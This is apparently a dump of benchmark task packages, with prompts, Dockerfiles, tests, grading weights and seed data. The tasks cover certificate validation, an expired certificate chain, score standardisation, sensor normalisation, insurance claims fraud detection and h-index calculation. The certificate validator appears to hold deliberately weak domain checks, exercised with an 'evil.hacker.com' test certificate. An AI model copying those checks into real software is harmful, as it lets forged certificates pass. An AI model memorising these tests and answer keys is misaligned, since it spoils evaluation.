x509.DNSName(\""www.tenant2.example.com\""),\n            x509.DNSName(\""admin.tenant2.example.com\""),\n        ]),\n        critical=False,\n    ).sign(key, hashes.SHA256())\n    \n    with open(\""multi_san_cert.pem\"", \""wb\"") as f:\n        f.write(cert.public_bytes(serialization.Encoding.PEM))\n    \n    return cert\n\ndef create_wrong_domain_cert():\n    \""\""\""Create a certificate for wrong domain (security test)\""\""\""\n    key = generate_key()\n    \n    subject = issuer = x509.Name([\n        x509.NameAttribute(NameOID.COMMON_NAME, \""evil.hacker.com\""),\n        x509.NameAttribute(NameOID.ORGANIZATION_NAME, \""Evil Corp\""),\n    ])\n    \n    cert = x509.CertificateBuilder().subject_name(\n        subject\n    ).issuer_name(\n        issuer\n    ).public_key(\n        key.public_key()\n    ).serial_number(\n        x509.random_serial_number()\n    ).not_valid_before(\n        datetime.datetime.utcnow()\n    ).not_valid_after(\n        datetime.datetime.utcnow() + datetime.timedelta(days=365)\n    ).sign(key, hashes.SHA256())\n    \n    with open(\""wrong_domain_cert.pem\"", \""wb\"") as f:\n        f.write(cert.public_bytes(serialization.Encoding.PEM))\n    \n    return cert\n\nif __name__ == \""__main__\"":\n    print(\""Generating test certificates...\"")\n    create_wildcard_cert()\n    print(\""Created wildcard_cert.pem\"")\n    create_multi_san_cert()\n    print(\""Created multi_san_cert.pem\"")\n    create_wrong_domain_cert()\n    print(\""Created wrong_domain_cert.pem\"")"", ""cert_validator.py"": ""import ssl\nimport socket\nfrom cryptography import x509\nfrom cryptography.hazmat.backends import default_backend\nfrom cryptography.x509.oid import NameOID, ExtensionOID\nimport re\nfrom typing import List, Optional, Tuple\n\n\nclass CertificateValidator:\n    def __init__(self):\n        self.tenant_domains = {}\n    \n    def add_tenant(self, tenant_id: str, domain: str):\n        \""\""\""Register a tenant with their domain\""\""\""\n        self.tenant_domains[tenant_id] = domain\n    \n    def validate_certificate(self, cert_pem: bytes, tenant_id: str) -> Tuple[bool, str]:\n        \""\""\""Validate a certificate for a specific tenant\""\""\""\n        if tenant_id not in self.tenant_domains:\n            return False, \""Unknown tenant\""\n        \n        expected_domain = self.tenant_domains[tenant_id]\n        \n        try:\n            cert = x509.load_pem_x509_certificate(cert_pem, default_backend())\n            \n            # Check if domain matches CN\n            cn = None\n            for attribute in cert.subject:\n                if attribute.oid == NameOID.COMMON_NAME:\n                    cn = attribute.value\n                    break\n            \n            if cn == expected_domain:\n                return True, \""Valid certificate\""\n            \n            if cn and cn.startswith(\""*.\""):\n                if cn[2:] == expected_domain:\n                    return True, \""Valid wildcard certificate\""\n            try:\n                san_ext = cert.extensions.get_extension_for_oid(ExtensionOID.SUBJECT_ALTERNATIVE_NAME)\n                sans = san_ext.value\n                if len(sans) > 0:\n                    first_san = str(sans[0].value)\n                    if first_san == expected_domain:\n                        return True, \""Valid SAN certificate\""\n            except x509.ExtensionNotFound:\n                pass\n            \n            return False, f\""Certificate does not match domain {expected_domain}\""\n            \n        except Exception as e:\n            return False, f\""Certificate validation error: {str(e)}\""\n    \n    def match_wildcard(self, wildcard_domain: str, target_domain: str) -> bool:\n        \""\""\""Check if a wildcard domain matches the target domain\""\""\""\n        if not wildcard_domain.startswith(\""*.\""):\n            return False\n        \n        wildcard_base = wildcard_domain[2:]\n        return target_domain == wildcard_base"", ""app.py"": ""from flask import Flask, request, jsonify\nfrom cert_validator import CertificateValidator\nimport base64\n\napp = Flask(__name__)\nvalidator = CertificateValidator()\n\n# Initialize some test tenants\nvalidator.add_tenant(\""tenant1\"", \""app.tenant1.example.com\"")\nvalidator.add_tenant(\""tenant2\"", \""api.tenant2.example.com\"")\nvalidator.add_tenant(\""tenant3\"", \""www.tenant3.example.com\"")\n\n@app.route('/validate', methods=['POST'])\ndef validate_cert():\n    \""\""\""Validate a certificate for a tenant\""\""\""\n    data = request.get_json()\n    \n    if not data or 'tenant_id' not in data or 'certificate' not in data:\n        return jsonify({'error': 'Missing tenant_id or certificate'}), 400\n    \n    tenant_id = data['tenant_id']\n    cert_b64 = data['certificate']\n    \n    try:\n        cert_pem = base64.b64decode(cert_b64)\n    except Exception as e:\n        return jsonify({'error': 'Invalid base64 certificate'}), 400\n    \n    is_valid, message = validator.validate_certificate(cert_pem, tenant_id)\n    \n    return jsonify({\n        'tenant_id': tenant_id,\n        'valid': is_valid,\n        'message': message\n    })\n\n@app.route('/health', methods=['GET'])\ndef health():\n    return jsonify({'status': 'ok'})\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=8080, debug=False)""}",2025-07-23T08:58:07.244587+00:00,2025-07-23T11:16:21.087234+00:00
draft_dp_7e6f2500,medium,draft_dp_7e6f2500,security,Payment gateway SSL handshake is failing. Need to diagnose the cert chain and fix it - system uses OpenSSL 1.0.2.,security,debugging|security|troubleshooting,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

# Install Python libraries
RUN pip install cryptography pyOpenSSL

# Create a wrapper script for OpenSSL 1.0.2 behavior
RUN echo '#!/bin/bash\n# Wrapper script to simulate OpenSSL 1.0.2 behavior\nopenssl ""$@""' > /usr/local/bin/openssl-1.0.2 && \
    chmod +x /usr/local/bin/openssl-1.0.2

WORKDIR /app

# Copy configuration and certificate generation script
COPY payment-gateway.conf /app/
COPY generate_certs.sh /app/

# Make script executable and run it to generate certificates
RUN chmod +x /app/generate_certs.sh && /app/generate_certs.sh

# Clean up
RUN rm /app/generate_certs.sh

CMD [""/bin/bash""]","import subprocess
import os
import re

def test_diagnostic_script_exists_and_identifies_expired_cert():
    """"""Test that a diagnostic script exists and correctly identifies the expired intermediate certificate""""""
    # Look for a diagnostic script (common names)
    possible_scripts = ['diagnose_cert.py', 'check_certs.py', 'diagnose.py', 'check_chain.py', 'cert_checker.py']
    script_found = None
    
    for script in possible_scripts:
        if os.path.exists(f'/app/{script}'):
            script_found = script
            break
    
    assert script_found is not None, ""No diagnostic script found""
    
    # Run the diagnostic script on the problematic chain
    result = subprocess.run(['python3', f'/app/{script_found}', '/app/certs/chain.pem'], 
                          capture_output=True, text=True)
    
    # Check that it identifies the expired intermediate certificate
    output = result.stdout + result.stderr
    assert 'expired' in output.lower(), ""Script did not identify expired certificate""
    assert 'intermediate' in output.lower(), ""Script did not identify which certificate is expired""

def test_fixed_certificate_chain_validates():
    """"""Test that a fixed certificate chain has been created and validates properly""""""
    # Check if a fixed chain exists
    assert os.path.exists('/app/certs/chain-fixed.pem'), ""No fixed certificate chain found""
    
    # Verify the fixed chain using OpenSSL 1.0.2
    result = subprocess.run(['/usr/local/bin/openssl-1.0.2', 'verify', '-CAfile', 
                           '/app/certs/root-ca.crt', '/app/certs/chain-fixed.pem'], 
                          capture_output=True, text=True)
    
    # The verification should succeed (return code 0)
    assert result.returncode == 0, f""Fixed chain verification failed: {result.stderr}""","{""test_diagnostic_script_exists_and_identifies_expired_cert"": 0.4, ""test_fixed_certificate_chain_validates"": 0.6}","{""payment-gateway.conf"": ""# Payment Gateway Configuration\nserver_url=https://payment.gateway.local:8443\ncert_chain_path=/app/certs/chain.pem\nprivate_key_path=/app/certs/private.key\ntimeout=30\nverify_ssl=true"", ""server-expired.crt"": ""-----BEGIN CERTIFICATE-----\nMIIDjTCCAnWgAwIBAgIJAKHHIr0kY5YUMA0GCSqGSIb3DQEBCwUAMF0xCzAJBgNV\nBAYTAlVTMRMwEQYDVQQIDApDYWxpZm9ybmlhMRYwFAYDVQQHDA1TYW4gRnJhbmNp\nc2NvMSEwHwYDVQQKDBhJbnRlcm1lZGlhdGUgQ0EgQ29tcGFueTAeFw0yMjAxMDEw\nMDAwMDBaFw0yMzAxMDEwMDAwMDBaMFkxCzAJBgNVBAYTAlVTMRMwEQYDVQQIDApD\nYWxpZm9ybmlhMRYwFAYDVQQHDA1TYW4gRnJhbmNpc2NvMR0wGwYDVQQKDBRQYXlt\nZW50IEdhdGV3YXkgSW5jLjCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEB\nALx3K8LmOmgBc8qN7JKfF2KqRW5wZx9TbUcG7oGVqZ4LrYZVBdEfeyNJv7uBR7SQ\nrUQJN1dT4bdKMNBpTRg7rnx8VmZJ1aWJbGYh4pFm3N4CpKR8sQjG8S2HFjT7NPQY\n7gIiPxTZJBvVH8KjGKVJsZxRrO3FpwJsGqRcFhQ2JTg"", ""generate_certs.sh"": ""#!/bin/bash\n# Script to generate test certificates for the payment gateway scenario\n\n# Create directories\nmkdir -p /app/certs\n\n# Generate Root CA key and certificate (valid)\nopenssl genrsa -out /app/certs/root-ca.key 2048\nopenssl req -x509 -new -nodes -key /app/certs/root-ca.key -sha256 -days 3650 -out /app/certs/root-ca.crt -subj \""/C=US/ST=California/L=San Francisco/O=Root CA Company/CN=Root CA\""\n\n# Generate Intermediate CA key and certificate (expired)\nopenssl genrsa -out /app/certs/intermediate-ca.key 2048\nopenssl req -new -key /app/certs/intermediate-ca.key -out /app/certs/intermediate-ca.csr -subj \""/C=US/ST=California/L=San Francisco/O=Intermediate CA Company/CN=Intermediate CA\""\n# Create expired intermediate cert with past dates\nopenssl x509 -req -in /app/certs/intermediate-ca.csr -CA /app/certs/root-ca.crt -CAkey /app/certs/root-ca.key -CAcreateserial -out /app/certs/intermediate-ca-expired.crt -sha256 -days 365 -set_serial 100 \\\n    -not_before 20220101000000Z -not_after 20230101000000Z\n\n# Generate server key and certificate (valid)\nopenssl genrsa -out /app/certs/server.key 2048\nopenssl req -new -key /app/certs/server.key -out /app/certs/server.csr -subj \""/C=US/ST=California/L=San Francisco/O=Payment Gateway Inc./CN=payment.gateway.local\""\nopenssl x509 -req -in /app/certs/server.csr -CA /app/certs/intermediate-ca-expired.crt -CAkey /app/certs/intermediate-ca.key -CAcreateserial -out /app/certs/server.crt -sha256 -days 365\n\n# Create the problematic chain with expired intermediate\ncat /app/certs/server.crt /app/certs/intermediate-ca-expired.crt /app/certs/root-ca.crt > /app/certs/chain.pem\n\n# Also create valid intermediate for the fix\nopenssl x509 -req -in /app/certs/intermediate-ca.csr -CA /app/certs/root-ca.crt -CAkey /app/certs/root-ca.key -CAcreateserial -out /app/certs/intermediate-ca-valid.crt -sha256 -days 3650 -set_serial 101\n\n# Copy the private key for the server\ncp /app/certs/server.key /app/certs/private.key\n\necho \""Certificates generated. Current chain has an expired intermediate certificate.\""""}",2025-07-23T08:48:39.138309+00:00,2025-07-23T11:16:54.631901+00:00
draft_dp_36909f99,medium,draft_dp_36909f99,data-processing,"The assessments.csv has scores in different formats (percentages, decimals, fractions). Need to standardize them all to 0-100 scale and calculate letter grades with +/- modifiers. Save the processed data to student_analytics.csv.",data-processing,python|data-processing|analysis,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

RUN pip install pandas==2.2.3 numpy

COPY assessments.csv /app/

CMD [""python""]","import os
import pandas as pd
import subprocess

def test_standardized_scores_created():
    """"""Test that student_analytics.csv exists with standardized scores""""""
    # Check if output file exists
    assert os.path.exists('/app/student_analytics.csv'), ""student_analytics.csv not created""
    
    # Load and verify the data
    df = pd.read_csv('/app/student_analytics.csv')
    
    # Check that all score columns exist and are numeric in 0-100 range
    score_columns = ['math_score', 'science_score', 'english_score', 'history_score']
    for col in score_columns:
        assert col in df.columns, f""{col} column missing""
        assert df[col].dtype in ['float64', 'int64'], f""{col} not numeric""
        assert df[col].min() >= 0, f""{col} has values below 0""
        assert df[col].max() <= 100, f""{col} has values above 100""

def test_letter_grades_with_modifiers():
    """"""Test that letter grades are calculated correctly with +/- modifiers""""""
    df = pd.read_csv('/app/student_analytics.csv')
    
    # Check grade_letter column exists
    assert 'grade_letter' in df.columns, ""grade_letter column missing""
    
    # Verify some specific grade calculations
    # For student with 92% average -> should be A-
    high_scorer = df[df['name'] == 'Carol Davis'].iloc[0]
    avg_score = high_scorer[['math_score', 'science_score', 'english_score', 'history_score']].mean()
    assert 90 <= avg_score <= 93, ""Test data assumption violated""
    assert high_scorer['grade_letter'] in ['A-', 'A'], f""Expected A- or A for score {avg_score}, got {high_scorer['grade_letter']}""
    
    # Check that all grades follow the pattern
    valid_grades = ['A+', 'A', 'A-', 'B+', 'B', 'B-', 'C+', 'C', 'C-', 'D+', 'D', 'D-', 'F']
    assert df['grade_letter'].isin(valid_grades).all(), ""Invalid grade letters found""","{""test_standardized_scores_created"": 0.5, ""test_letter_grades_with_modifiers"": 0.5}","{""assessments.csv"": ""student_id,name,math_score,science_score,english_score,history_score\n2023CS001,Alice Johnson,85%,0.92,78%,18/20\n2023CS002,Bob Smith,0.75,82%,15/20,88%\n2023ME001,Carol Davis,92%,0.88,0.91,77%\n2023ME002,David Wilson,17/20,79%,0.83,0.71\n2023CS003,Emma Brown,0.94,90%,88%,19/20\n2023EE001,Frank Miller,73%,0.68,14/20,0.82\n2023EE002,Grace Lee,0.81,75%,79%,16/20\n2023CS004,Henry Chen,88%,0.95,0.86,84%\n2023ME003,Isabel Garcia,16/20,0.77,83%,0.89\n2023CS005,Jack Thompson,0.69,71%,0.74,15/20""}",2025-07-23T09:42:20.279688+00:00,2025-07-23T09:42:20.313072+00:00
draft_dp_42673aab,extremely_hard,draft_dp_42673aab,data-processing,"The IoT sensor data in /app/sensor_data.csv is a mess - different timestamps, units, and sampling rates. Need it normalized to 1-minute intervals with standard units (Celsius, %, hPa) and anomaly detection. Save to normalized_sensors.csv.",data-processing,python|data-processing|numpy,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

RUN pip install pandas==2.2.3 numpy pytz

COPY sensor_data.csv /app/","import os
import pandas as pd
import numpy as np

def test_normalized_output_exists_and_valid():
    """"""Test that normalized output file exists with correct structure""""""
    assert os.path.exists('/app/normalized_sensors.csv'), ""normalized_sensors.csv should exist""
    
    df = pd.read_csv('/app/normalized_sensors.csv')
    
    # Check required columns exist
    required_cols = ['timestamp', 'device_id', 'temp_celsius', 'humidity_percent', 
                     'pressure_hpa', 'anomaly_flag']
    for col in required_cols:
        assert col in df.columns, f""Column '{col}' should exist in output""
    
    # Check data types and ranges
    assert df['temp_celsius'].dtype in [np.float64, np.float32], ""Temperature should be numeric""
    assert df['humidity_percent'].min() >= 0, ""Humidity should be >= 0""
    assert df['humidity_percent'].max() <= 100, ""Humidity should be <= 100""
    assert df['pressure_hpa'].min() > 0, ""Pressure should be positive""
    
    # Check anomaly detection caught the obvious spike (98.2C temperature)
    anomalies = df[df['anomaly_flag'] == True]
    assert len(anomalies) > 0, ""Should detect at least one anomaly (e.g., 98.2C temperature spike)""

def test_timestamp_alignment_and_interpolation():
    """"""Test that data is properly aligned to 1-minute intervals""""""
    df = pd.read_csv('/app/normalized_sensors.csv', parse_dates=['timestamp'], index_col='timestamp')
    
    # Check timestamps are at regular 1-minute intervals
    timestamps = df.index.to_series()
    time_diffs = timestamps.diff().dropna()
    
    # All time differences should be 60 seconds (allowing for some edge cases)
    assert (time_diffs == pd.Timedelta(seconds=60)).sum() / len(time_diffs) > 0.95, \
        ""At least 95% of timestamps should be at 1-minute intervals""
    
    # Check that data gaps are properly handled with quality flags
    if 'data_quality' in df.columns:
        # If there are interpolated values, they should be marked
        interpolated = df[df['data_quality'] == 'interpolated']
        assert len(interpolated) >= 0, ""Data quality column should exist when gaps are filled""","{""test_normalized_output_exists_and_valid"": 0.6, ""test_timestamp_alignment_and_interpolation"": 0.4}","{""sensor_data.csv"": ""timestamp,device_id,raw_value,sensor_type\n2024-03-15T10:00:00Z,ACME_TH100_A001,22.5C,temperature\n1710500460,ACME_TH100_A001,65%,humidity\n15/03/2024 10:01:30,ACME_TH100_A001,1013.25hPa,pressure\n2024-03-15T10:02:00Z,ACME_TH100_A001,22.8C,temperature\n1710500580,ACME_TH100_A001,0.64,humidity\n15/03/2024 10:03:30,ACME_TH100_A001,1013.3hPa,pressure\n2024-03-15T10:05:00Z,ACME_TH100_A001,23.1C,temperature\n1710500700,ACME_TH100_A001,63%,humidity\n2024-03-15T10:10:00Z,WEATHERTECH_WS200_B002,72.5F,temperature\n1710501000000,WEATHERTECH_WS200_B002,0.58,humidity\n15/03/2024 10:10:00,WEATHERTECH_WS200_B002,1.01325bar,pressure\n2024-03-15T10:11:00Z,WEATHERTECH_WS200_B002,72.8F,temperature\n1710501060000,WEATHERTECH_WS200_B002,57%,humidity\n15/03/2024 10:11:00,WEATHERTECH_WS200_B002,101325Pa,pressure\n2024-03-15T10:12:00Z,WEATHERTECH_WS200_B002,73.1F,temperature\n1710501180000,WEATHERTECH_WS200_B002,0.56,humidity\n2024-03-15T10:15:00Z,SENSORIO_ENVIRO_C003,295.65K,temperature\n1710501300,SENSORIO_ENVIRO_C003,45%,humidity\n15/03/2024 10:15:30,SENSORIO_ENVIRO_C003,1012.5hPa,pressure\n2024-03-15T10:16:00Z,SENSORIO_ENVIRO_C003,295.95K,temperature\n1710501420,SENSORIO_ENVIRO_C003,0.44,humidity\n15/03/2024 10:17:00,SENSORIO_ENVIRO_C003,101250Pa,pressure\n2024-03-15T10:18:00Z,SENSORIO_ENVIRO_C003,296.15K,temperature\n2024-03-15T10:20:00Z,ACME_TH100_A001,24.5C,temperature\n1710501720,ACME_TH100_A001,61%,humidity\n15/03/2024 10:21:00,ACME_TH100_A001,1013.5hPa,pressure\n2024-03-15T10:22:00Z,ACME_TH100_A001,98.2C,temperature\n1710501920,ACME_TH100_A001,60%,humidity\n15/03/2024 10:23:00,ACME_TH100_A001,1013.6hPa,pressure\n2024-03-15T10:24:00Z,ACME_TH100_A001,25.1C,temperature\n1710502080,ACME_TH100_A001,0.59,humidity\n2024-03-15T10:30:00Z,WEATHERTECH_WS200_B002,74.5F,temperature\n1710502200000,WEATHERTECH_WS200_B002,55%,humidity\n15/03/2024 10:30:30,WEATHERTECH_WS200_B002,1.01335bar,pressure\n2024-03-15T10:35:00Z,SENSORIO_ENVIRO_C003,297.15K,temperature\n1710502500,SENSORIO_ENVIRO_C003,0.42,humidity\n15/03/2024 10:35:00,SENSORIO_ENVIRO_C003,1012.8hPa,pressure\n2024-03-15T10:45:00Z,ACME_TH100_A001,26.0C,temperature\n1710503100,ACME_TH100_A001,58%,humidity\n15/03/2024 10:45:30,ACME_TH100_A001,1013.7hPa,pressure\n2024-03-15T11:00:00Z,WEATHERTECH_WS200_B002,75.2F,temperature\n1710504000000,WEATHERTECH_WS200_B002,0.54,humidity\n15/03/2024 11:00:00,WEATHERTECH_WS200_B002,101340Pa,pressure""}",2025-07-23T09:59:46.758307,2025-07-23T11:17:53.828180+00:00
draft_dp_e30af41c,extremely_hard,draft_dp_e30af41c,data-processing,The claims processor is rejecting valid claims and the fraud detection is flagging everything. Need it fixed to generate proper claim_report.json with accurate payouts and only flag actual fraud patterns (3+ claims in 30 days or amounts >2x typical).,data-processing,python|debugging|data-processing,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

# Copy data files
COPY policies.csv /app/
COPY claims.csv /app/
COPY customers.csv /app/
COPY coverage_rules.csv /app/
COPY business_rules.json /app/

# Copy the broken claims processor
COPY claims_processor.py /app/

# Install dependencies
RUN pip install pandas jsonschema

CMD [""python"", ""claims_processor.py""]","import json
import os
import subprocess

def test_claim_report_generated():
    """"""Test that the claim report JSON file is generated""""""
    # Run the claims processor
    result = subprocess.run(['python', '/app/claims_processor.py'], 
                          capture_output=True, text=True)
    
    # Check if claim_report.json exists
    assert os.path.exists('/app/claim_report.json'), ""claim_report.json not generated""
    
    # Verify it's valid JSON
    with open('/app/claim_report.json', 'r') as f:
        data = json.load(f)
    
    assert 'processed_claims' in data
    assert 'fraud_alerts' in data
    assert 'statistics' in data

def test_valid_claims_processed_correctly():
    """"""Test that valid claims are processed with correct payouts""""""
    # Run the processor if not already done
    if not os.path.exists('/app/claim_report.json'):
        subprocess.run(['python', '/app/claims_processor.py'], 
                      capture_output=True, text=True)
    
    with open('/app/claim_report.json', 'r') as f:
        report = json.load(f)
    
    # Check that valid claims are approved
    processed_claims = report['processed_claims']
    
    # Verify claim CLM001 (valid auto claim)
    clm001 = next((c for c in processed_claims if c['claim_id'] == 'CLM001'), None)
    assert clm001 is not None
    assert clm001['status'] == 'approved'
    assert clm001['approved_amount'] > 0
    # Should be 80% of (5000 - 500 deductible) = 3600
    assert abs(clm001['approved_amount'] - 3600) < 0.01

def test_fraud_detection_accuracy():
    """"""Test that fraud detection only flags actual suspicious patterns""""""
    # Run the processor if not already done
    if not os.path.exists('/app/claim_report.json'):
        subprocess.run(['python', '/app/claims_processor.py'], 
                      capture_output=True, text=True)
    
    with open('/app/claim_report.json', 'r') as f:
        report = json.load(f)
    
    fraud_alerts = report['fraud_alerts']
    
    # Should only flag customer CUST003 (multiple claims pattern)
    assert len(fraud_alerts) == 1
    assert fraud_alerts[0]['customer_id'] == 'CUST003'
    assert 'multiple_claims' in fraud_alerts[0]['reason']","{""test_claim_report_generated"": 0.2, ""test_valid_claims_processed_correctly"": 0.5, ""test_fraud_detection_accuracy"": 0.3}","{""business_rules.json"": ""{\n    \""fraud_detection\"": {\n        \""multiple_claims_threshold\"": 3,\n        \""time_window_days\"": 30,\n        \""amount_multiplier\"": 2.0\n    },\n    \""processing_rules\"": {\n        \""require_active_policy\"": true,\n        \""apply_deductible\"": true,\n        \""validate_coverage_type\"": true\n    }\n}"", ""customers.csv"": ""customer_id,risk_category,claim_history_flag\nCUST001,low,false\nCUST002,medium,true\nCUST003,high,true\nCUST004,low,false"", ""claims.csv"": ""claim_id,policy_number,claim_type,amount,date,description\nCLM001,POL001,auto,5000,2024-07-15,Car accident repair\nCLM002,POL002,home,8000,2024-08-20,Water damage\nCLM003,POL003,auto,3000,2024-11-01,Windshield replacement\nCLM004,POL003,auto,4500,2024-11-15,Bumper damage\nCLM005,POL003,auto,2800,2024-11-28,Side mirror repair\nCLM006,POL004,home,12000,2024-10-01,Expired policy claim\nCLM007,POL005,dental,1500,2024-09-01,Wrong coverage type"", ""claims_processor.py"": ""import pandas as pd\nimport json\nfrom datetime import datetime, timedelta\n\ndef process_claims():\n    # Load data\n    policies = pd.read_csv('policies.csv')\n    claims = pd.read_csv('claims.csv')\n    customers = pd.read_csv('customers.csv')\n    coverage_rules = pd.read_csv('coverage_rules.csv')\n    \n    with open('business_rules.json', 'r') as f:\n        business_rules = json.load(f)\n    \n    # Convert dates\n    policies['start_date'] = pd.to_datetime(policies['start_date'])\n    policies['end_date'] = pd.to_datetime(policies['end_date'])\n    claims['date'] = pd.to_datetime(claims['date'])\n    \n    # Merge data\n    claim_details = claims.merge(policies, on='policy_number')\n    claim_details = claim_details.merge(customers, on='customer_id')\n    claim_details = claim_details.merge(coverage_rules, left_on='coverage_type', right_on='coverage_type')\n    \n    processed_claims = []\n    fraud_alerts = []\n    \n    for _, claim in claim_details.iterrows():\n        result = {\n            'claim_id': claim['claim_id'],\n            'policy_number': claim['policy_number'],\n            'customer_id': claim['customer_id'],\n            'status': 'rejected',\n            'reason': 'Invalid claim',\n            'approved_amount': 0\n        }\n        \n        # Policy validation\n        if claim['date'] > claim['end_date']:\n            result['reason'] = 'expired_policy'\n        elif claim['claim_type'] == claim['coverage_type']:\n            result['reason'] = 'invalid_coverage'\n        \n        # Payout calculation\n        if result['status'] == 'approved':\n            amount_after_deductible = max(0, claim['amount'] - claim['deductible'])\n            payout = amount_after_deductible * (claim['payout_percentage'] / 100)\n            result['approved_amount'] = min(payout, claim['limit'])\n        \n        processed_claims.append(result)\n    \n    # Fraud detection\n    for customer_id in customers['customer_id']:\n        customer_claims = claims[claims['policy_number'].isin(\n            policies[policies['customer_id'] == customer_id]['policy_number']\n        )]\n        \n        if len(customer_claims) > 0:\n            fraud_alerts.append({\n                'customer_id': customer_id,\n                'reason': 'suspicious_activity',\n                'claim_count': len(customer_claims)\n            })\n    \n    # Generate report\n    report = {\n        'processed_claims': processed_claims,\n        'fraud_alerts': fraud_alerts,\n        'statistics': {\n            'total_claims': len(claims),\n            'approved_claims': 0,\n            'rejected_claims': len(claims),\n            'total_payout': 0\n        }\n    }\n    \n    with open('claim_report.json', 'w') as f:\n        json.dump(report, f, indent=2)\n\nif __name__ == '__main__':\n    process_claims()"", ""coverage_rules.csv"": ""coverage_type,payout_percentage,max_limit,typical_amount\nauto,80,50000,2500\nhome,90,200000,5000\nhealth,70,100000,1000\ndental,60,5000,500"", ""policies.csv"": ""policy_number,customer_id,coverage_type,limit,deductible,start_date,end_date\nPOL001,CUST001,auto,50000,500,2024-01-01,2025-01-01\nPOL002,CUST002,home,200000,1000,2024-03-15,2025-03-15\nPOL003,CUST003,auto,75000,250,2024-06-01,2025-06-01\nPOL004,CUST001,home,150000,1500,2023-12-01,2024-12-01\nPOL005,CUST004,health,100000,2000,2024-02-01,2025-02-01""}",2025-07-23T08:56:33.427837+00:00,2025-07-23T11:18:18.816476+00:00
draft_dp_31fc30fe,hard,draft_dp_31fc30fe,data-science,"Build a citation analysis tool that calculates h-index for researchers and generates a research impact report. Use the CSV files (publications.csv, citations.csv, researchers.csv) to compute metrics and output results to impact_report.json.",data-science,python|algorithm-implementation|data-processing,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

# Install required Python packages
RUN pip install pandas networkx

# Copy data files
COPY publications.csv /app/
COPY citations.csv /app/
COPY researchers.csv /app/

# Copy a partially implemented script that needs h-index calculation
COPY analyze_research.py /app/

CMD [""bash""]","import os
import json
import subprocess

def test_impact_report_generated():
    """"""Test that the impact report JSON file is generated""""""
    # Run the analysis script
    result = subprocess.run(['python', 'analyze_research.py'], 
                          capture_output=True, text=True, cwd='/app')
    
    # Check that the script ran successfully
    assert result.returncode == 0
    
    # Check that the output file exists
    assert os.path.exists('/app/impact_report.json')
    
    # Load and validate the JSON content
    with open('/app/impact_report.json', 'r') as f:
        report = json.load(f)
    
    # Basic structure validation
    assert 'researchers' in report
    assert 'total_publications' in report
    assert 'total_citations' in report
    assert len(report['researchers']) == 6  # We have 6 researchers

def test_h_index_calculation():
    """"""Test that h-index is correctly calculated for researchers""""""
    # First ensure the report exists
    if not os.path.exists('/app/impact_report.json'):
        subprocess.run(['python', 'analyze_research.py'], 
                      capture_output=True, text=True, cwd='/app')
    
    with open('/app/impact_report.json', 'r') as f:
        report = json.load(f)
    
    # Find Dr. Sarah Chen (R001) who should have h-index of 2
    # She has 4 papers with citations: 6, 3, 0, 0
    # So h-index = 2 (2 papers with at least 2 citations each)
    sarah = next(r for r in report['researchers'] if r['id'] == 'R001')
    assert sarah['h_index'] == 2
    
    # Find Dr. Robert Kim (R006) who should have h-index of 1
    # He has 2 papers with citations: 1, 0
    robert = next(r for r in report['researchers'] if r['id'] == 'R006')
    assert robert['h_index'] == 1","{""test_impact_report_generated"": 0.3, ""test_h_index_calculation"": 0.7}","{""publications.csv"": ""doi,title,authors,journal,year,field\n10.1000/j1.2020.001,Machine Learning in Healthcare,R001;R002,Journal of AI Medicine,2020,Computer Science\n10.1000/j1.2020.002,Deep Learning for Medical Imaging,R001;R003,Journal of AI Medicine,2020,Computer Science\n10.1000/j2.2021.001,Neural Networks in Diagnostics,R002;R003,Medical AI Review,2021,Computer Science\n10.1000/j2.2021.002,AI-Driven Drug Discovery,R001,Medical AI Review,2021,Computer Science\n10.1000/j3.2022.001,Transformer Models for Clinical Data,R001;R002;R003,Healthcare Technology,2022,Computer Science\n10.1000/j3.2022.002,Federated Learning in Healthcare,R003;R004,Healthcare Technology,2022,Computer Science\n10.1000/j4.2020.001,Statistical Methods in Medicine,R004;R005,Biostatistics Journal,2020,Statistics\n10.1000/j4.2021.001,Bayesian Analysis for Clinical Trials,R005,Biostatistics Journal,2021,Statistics\n10.1000/j5.2022.001,Genomic Data Analysis,R004;R005;R006,Computational Biology,2022,Biology\n10.1000/j5.2022.002,Protein Folding Predictions,R006,Computational Biology,2022,Biology"", ""researchers.csv"": ""researcher_id,name,affiliation,field\nR001,Dr. Sarah Chen,Stanford University,Computer Science\nR002,Dr. Michael Johnson,MIT,Computer Science\nR003,Dr. Emily Wang,Harvard Medical School,Computer Science\nR004,Dr. James Anderson,Johns Hopkins,Statistics\nR005,Dr. Lisa Martinez,UC Berkeley,Statistics\nR006,Dr. Robert Kim,Yale University,Biology"", ""citations.csv"": ""citing_doi,cited_doi\n10.1000/j1.2020.002,10.1000/j1.2020.001\n10.1000/j2.2021.001,10.1000/j1.2020.001\n10.1000/j2.2021.001,10.1000/j1.2020.002\n10.1000/j2.2021.002,10.1000/j1.2020.001\n10.1000/j3.2022.001,10.1000/j1.2020.001\n10.1000/j3.2022.001,10.1000/j1.2020.002\n10.1000/j3.2022.001,10.1000/j2.2021.001\n10.1000/j3.2022.002,10.1000/j1.2020.001\n10.1000/j3.2022.002,10.1000/j2.2021.001\n10.1000/j4.2021.001,10.1000/j4.2020.001\n10.1000/j5.2022.001,10.1000/j4.2020.001\n10.1000/j5.2022.001,10.1000/j4.2021.001\n10.1000/j5.2022.002,10.1000/j5.2022.001"", ""analyze_research.py"": ""#!/usr/bin/env python3\nimport pandas as pd\nimport json\nfrom collections import defaultdict\n\ndef load_data():\n    \""\""\""Load research data from CSV files\""\""\""\n    publications = pd.read_csv('publications.csv')\n    citations = pd.read_csv('citations.csv')\n    researchers = pd.read_csv('researchers.csv')\n    return publications, citations, researchers\n\ndef calculate_citation_counts(publications, citations):\n    \""\""\""Count citations for each publication\""\""\""\n    citation_counts = citations['cited_doi'].value_counts().to_dict()\n    for doi in publications['doi']:\n        if doi not in citation_counts:\n            citation_counts[doi] = 0\n    return citation_counts\n\ndef calculate_h_index(researcher_id, publications, citation_counts):\n    \""\""\""Calculate h-index for a researcher\""\""\""\n    # Implementation needed\n    pass\n\ndef generate_report(publications, citations, researchers):\n    \""\""\""Generate research impact report\""\""\""\n    citation_counts = calculate_citation_counts(publications, citations)\n    \n    report = {\n        